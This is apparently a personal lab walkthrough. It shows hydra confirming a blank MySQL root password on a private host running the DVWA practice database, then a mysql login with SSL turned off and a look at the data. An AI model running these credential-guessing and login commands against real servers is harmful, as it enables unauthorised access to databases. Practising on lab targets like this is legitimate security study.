so as we know in mysql the default user is root and has no password or say blank
**hydra -l root 192.168.177.128 mysql -p ''**
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-24 17:28:23
[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking mysql://192.168.177.128:3306/
[3306][mysql] host: 192.168.177.128   login: root
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-24 17:28:24

so we confirmed that the user is **root** and password is **blank**
now we do the login to mysql using the username and ip
**mysql -u root -h 192.168.177.128**
but it got the version error 
so stop the sql version verification 
**mysql -u root -h 192.168.177.128 --ssl=OFF**
and here we got the access
![[Pasted image 20241224173156.png]]

i checked the dvwa database and got some info from it
![[Pasted image 20241224173600.png]]
just like this we can see more details
